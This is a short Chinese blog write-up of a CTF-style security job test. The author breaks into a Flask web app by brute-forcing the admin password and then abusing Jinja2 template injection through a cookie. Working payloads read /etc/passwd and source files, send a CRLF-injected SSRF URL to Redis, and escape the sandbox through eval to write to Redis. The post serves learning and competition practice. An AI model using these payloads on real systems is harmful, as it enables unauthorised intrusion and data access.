---
title: 绿盟安全研究员笔试(web方向一道有意思的CTF)
date: 2017-10-16 04:41:28
tags: CTF
---
# 绿盟安全研究员笔试题目

## 0x00 描述
终于想到了要更新下博客了
作为一个web狗只会做web题目
题目只给了一个ip
要求把自己的名字加到候选人名单

## 0x01 信息收集
开放5000 和22 端口
5000 是web服务

## 0x01 利用

### step 1
爆破了一天admin的密码，最终爆破出来的admin密码是nsfocus
![](http://oxcdafmr9.bkt.gdipper.com//nsfocus/1.png)

### step 2
登录后发现 没有啥用，仔细观看发现cookie有个username=admin的cookie
修改后发现疑似格式化字符串漏洞
![](http://oxcdafmr9.bkt.gdipper.com//nsfocus/2.png)
测试漏洞发现存在[jinjia2任意代码执行](http://www.freebuf.com/articles/system/97146.html)
读/etc/passwd
```cookie
username={{[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read()}};
```
![](http://oxcdafmr9.bkt.gdipper.com//nsfocus/3.png)

### step 3
本来想的是直接命令执行，结果发现主要函数都被ban了。如图
![](http://oxcdafmr9.bkt.gdipper.com//nsfocus/4.png)
![](http://oxcdafmr9.bkt.gdipper.com//nsfocus/5.png)
那就读源码,这里不能直接读，需要读pyc文件进行还原。这里转成了hex
```cookie
username={{[].__class__.__base__.__subclasses__()[40]('/opt/src/nsctf/websec/views.pyc','rb').read().encode('hex')}}; sessionid=8tod6wf9ufy71q5qce2r0jzgi6q57p93
```
![](http://oxcdafmr9.bkt.gdipper.com//nsfocus/6.png)

## step 4
这里发现候选人名单是redis里面的
也就是要进行ssrf
这里的MD5的密码是flag=w3ll_d0ne
感觉是[http头注入](blog.blindspotsecurity.com/2016/06/advisory-http-header-injection-in.html)
测试发现，不能ssrf。但是相同环境本地可以ssrf
本地payload如下
```url
http://127.0.0.1%0D%0A%2a3%0D%0A%245%0D%0Arpush%0D%0A%2410%0D%0Acandidates%0D%0A%245%0D%0At1m0n%0D%0A:6379/foo
```

## step 5
卡了很久。最后想到了如果包含views.py 通过REDIS把自己名字加进去也可以
于是这样利用
最后的利用如下
```txt
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{% for b in c.__init__.func_globals.values() %}{% if b.__class__ == {}.__class__ %}{% if 'eval' in b.keys() %}{{ b['eval']('__import__("sys").path.append("/opt/src/nsctf/websec")') }}{{ b['eval']('__import__("views").REDIS.rpush(u"candidates","T1m0n")') }}{% endif %}{% endif %}{%endfor%}{% endif %}{% endfor %};
```
![](http://oxcdafmr9.bkt.gdipper.com//nsfocus/7.png)


